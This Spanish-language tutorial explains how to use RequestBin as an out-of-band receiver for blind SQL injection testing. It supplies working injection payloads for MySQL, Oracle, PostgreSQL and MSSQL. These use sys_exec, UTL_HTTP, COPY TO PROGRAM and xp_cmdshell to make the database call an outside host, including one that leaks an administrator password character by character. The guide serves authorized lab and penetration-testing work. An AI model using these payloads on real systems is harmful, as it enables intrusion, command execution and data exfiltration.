
---
# Guía: usar RequestBin (requestbin.whapi.cloud) como alternativa OOB para SQLi

En este apartado explicamos los pasos exactos para usar [RequestBin](https://requestbin.whapi.cloud/) como receptor de interacciones out-of-band (OOB) en pruebas de SQL Injection ciega. Incluimos un ejemplo concreto de payload, variantes por motor que provocan peticiones HTTP, y una checklist mínima para documentar la evidencia.

---

## Resumen rápido

Usamos RequestBin cuando la base de datos puede emitir peticiones HTTP y queremos capturar esa interacción en una URL pública. Es útil como alternativa a Burp Collaborator cuando sólo necesitamos OOB HTTP y el entorno permite conexiones externas.

---

## 1 — Flujo paso a paso (1 → 2 → 3)

1. **Crear/obtener la URL de RequestBin.**
    
    - Abrimos `https://requestbin.whapi.cloud/` y generamos una bin; nos devolverá una URL del tipo `http://requestbin.whapi.cloud/<ID>`.
        
2. **Probar la URL desde nuestro equipo.**
    
    - Ejecutamos un curl o un pequeño script para verificar que la bin recibe peticiones:
        
        ```bash
        curl -X POST -d "test=1" "http://requestbin.whapi.cloud/<ID>"
        ```
        
    - Confirmamos en la interfaz de RequestBin que la petición aparece.
        
3. **Construir la payload SQL que haga una petición HTTP al BIN_URL.**
    
    - Elegimos la técnica adecuada según el motor de BD y funciones habilitadas (ver ejemplos abajo).
        
    - Añadimos un identificador único por prueba en la ruta (p. ej. `/test-pos1-<timestamp>`) para correlacionar la evidencia.
        
4. **Enviar la petición al objetivo (inyectar la payload).**
    
    - Inyectamos la payload donde corresponda (cookie, parámetro POST, header), respetando el encoding necesario.
        
5. **Esperar y monitorizar RequestBin.**
    
    - Observamos la llegada de la petición en la bin; guardamos cabeceras, cuerpo y timestamps.
        
6. **Documentar la evidencia.**
    
    - Guardamos captura de la petición HTTP original, la payload inyectada, y la entrada en RequestBin.
        

---

## 2 — Ejemplo práctico (con RequestBin URL de ejemplo)

**BIN de ejemplo:** `http://requestbin.whapi.cloud/1k71bud1`

**Prueba rápida desde cliente (curl):**

```bash
curl -X POST -d "fizz=buzz" http://requestbin.whapi.cloud/1k71bud1
```

Comprobamos en la UI de RequestBin que la petición aparece.

**Ejemplo de payload para inyectar en la cookie `TrackingId` (MySQL con ejecución de comando disponible):**

```
TrackingId=VALOR_ORIGINAL' OR IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='d', sys_exec(CONCAT('curl -s http://requestbin.whapi.cloud/1k71bud1/test-pos1-', (SELECT FLOOR(RAND()*1000000)))), 0) -- -
```

> Nota: `sys_exec` es una UDF no estándar y normalmente no está disponible; este ejemplo muestra el concepto cuando existen UDFs/exec.

---

## 3 — Payloads HTTP OOB conceptuales por SGBD (reemplazar `<BIN_URL>`)

**Oracle (si `UTL_HTTP` está disponible):**

```sql
' OR (SELECT UTL_HTTP.request('http://<BIN_URL>/test-pos1')) FROM dual --
```

**PostgreSQL (si `COPY TO PROGRAM` o extensiones de HTTP están disponibles):**

```sql
'; COPY (SELECT '') TO PROGRAM 'curl -s http://<BIN_URL>/test-pos1' ; --
```

**MySQL (solo si existe UDF / sys_exec o similar):**

```sql
' OR (SELECT sys_exec(CONCAT('curl -s http://', '<BIN_HOST>', '/test-pos1'))) --
```

**MSSQL (si `xp_cmdshell` habilitado):**

```sql
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://<BIN_URL>/test-pos1 -UseBasicParsing"'--
```

**Advertencia:** la disponibilidad de estas técnicas depende de funciones y privilegios del servidor; si no están habilitadas, RequestBin no recibirá nada.

---

## 4 — Cómo construir un identificador único por prueba

Para correlacionar evidencia, añadimos un sufijo único en la ruta cuando sea posible:

```
http://<BIN_HOST>/<ID>/test-pos{POS}-{TIMESTAMP}
```

Ejemplo con shell/curl desde nuestro equipo:

```bash
TS=$(date +%s)
curl -X GET "http://requestbin.whapi.cloud/1k71bud1/test-pos1-${TS}"
```

En la petición SQL incorporamos esa ruta (o la parte final) para relacionar la prueba con el log.

---

## 5 — Checklist mínima para documentar la evidencia

-  URL de RequestBin usada y hora (UTC).
    
-  Payload SQL exacta inyectada (texto tal y como la enviamos, con encoding si corresponde).
    
-  Petición HTTP original hacia el objetivo (captura de Burp/mitmproxy/ZAP) mostrando la cookie/parametro con la payload.
    
-  Entrada en RequestBin (captura del header/body, y timestamp) que coincida con la prueba.
    
-  Notas sobre permisos y entorno (lab, autorización explícita).
    

---

## 6 — Buenas prácticas y precauciones

- No exfiltrar datos sensibles a un servicio público. Para evidencias sensibles usar un servidor propio o Collaborator privado.
    
- Calibrar la payload y probar la URL de BIN antes de inyectar.
    
- URL-encodear la payload cuando la enviemos en cookies o parámetros (p. ej. `'` → `%27`, `;` → `%3B`).
    
- Si el laboratorio bloquea conexiones externas, usar el mecanismo que el lab requiera (por ejemplo Burp Collaborator público).
    

---

## 7 — Ejemplo de cómo incluir la URL en la cookie `TrackingId` (formato)

```
TrackingId=VALOR_ORIGINAL' OR (SELECT UTL_HTTP.request('http://requestbin.whapi.cloud/1k71bud1/test-pos1')) FROM dual --
```

Recordemos que en entornos reales quizá haga falta URL-encodear la carga completa al formarla.

---
